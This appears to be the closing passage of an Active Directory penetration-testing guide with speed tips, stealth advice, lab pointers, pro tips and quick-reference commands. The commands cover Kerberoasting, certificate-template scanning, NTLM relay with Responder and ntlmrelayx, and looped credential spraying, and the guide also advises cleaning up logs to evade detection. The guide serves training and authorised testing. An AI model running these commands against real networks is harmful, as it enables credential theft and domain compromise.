- **Web Apps**: Look for LDAP injection, password in source code
- **File Shares**: Always check SYSVOL for GPP passwords
- **Certificates**: Check for vulnerable templates and relay opportunities
- **Services**: SQL servers often have domain admin privileges
- **Backups**: Look for password backup solutions and historical data

#### 🚀 Speed Optimization

```bash
# Quick Domain Survey
crackmapexec smb $TARGETS --gen-relay-list relay_targets.txt
crackmapexec ldap $DC -u '' -p '' --users --groups
bloodhound-python -c All -u guest -p '' -d domain.com -ns $DC
```

#### 🎭 Stealth Considerations

- Use --stealth flags when available
- Rotate source IPs and user agents
- Time delays between attacks
- Clean up artifacts and logs
- Use legitimate tools when possible (PowerShell, WMI)

### 📚 Advanced Learning Resources

#### 🔬 Practice Labs

- **GOAD (Game of Active Directory)**: Complex multi-forest lab
- **VulnLab**: Advanced AD scenarios
- **HackTheBox Pro Labs**: Dante, RastaLabs, Offshore
- **TryHackMe**: Holo, Wreath networks

#### 🛠️ Custom Tooling

```bash
# Build custom wordlists
cewl https://company.com > custom_wordlist.txt
hashcat --stdout -r best64.rule custom_wordlist.txt > enhanced_wordlist.txt

# Automation scripts
for target in $(cat targets.txt); do crackmapexec smb $target -u users.txt -p passwords.txt; done
```

### 🔥 Pro Tips for Advanced Practitioners

1. **Always enumerate certificates first** - ADCS misconfigurations are common and powerful
2. **Coercion attacks are goldmines** - PetitPotam, PrinterBug, Coercer for forced authentication
3. **Don't ignore Exchange** - PrivExchange and ProxyLogon/ProxyShell are game-changers
4. **RBCD is underutilized** - Easier than traditional delegation attacks
5. **Shadow Credentials bypass MFA** - Modern technique for certificate-based attacks
6. **Trust relationships are highways** - Bidirectional trusts for lateral movement
7. **Check AdminSDHolder periodically** - Hidden privilege escalation opportunities
8. **LAPS enumeration pays off** - Local admin passwords for widespread access
9. **DNS is often overlooked** - DNS admin privileges can lead to domain admin
10. **Event logs tell stories** - Understand what you're generating for better evasion

### ⚡ Quick Reference Commands

```bash
# One-liner domain takeover check
GetUserSPNs.py -dc-ip $DC domain.com/guest: -request | grep -i admin

# Certificate vulnerability scan
certipy find -u guest@domain.com -p '' -dc-ip $DC -vulnerable -stdout

# Quick NTLM relay setup
responder -I eth0 -A & ntlmrelayx.py -tf targets.txt -smb2support

# BloodHound data collection
sharphound.exe -c All --stealth --zipfilename $(hostname)_$(date +%Y%m%d).zip
```

---

## About Me

**Mrx0rd**  
*Cybersecurity Researcher & Active Directory Specialist*

Passionate about Active Directory security research, advanced penetration testing methodologies, and red team operations. Constantly exploring new attack vectors and sharing knowledge with the cybersecurity community through comprehensive guides and practical research.

Always learning, always hacking, always improving the art of ethical penetration testing.

---

*"In Active Directory, there are no coincidences, only misconfigurations waiting to be discovered."*

#ActiveDirectory #PenetrationTesting #RedTeam #Cybersecurity #InfoSec #Hacking #CRTP #CRTE #CRTM #HackTheBox #Kerberos #ADCS #PowerShell #Impacket #BloodHound #Mimikatz #CyberSec #EthicalHacking #SecurityResearch #ADAttacks
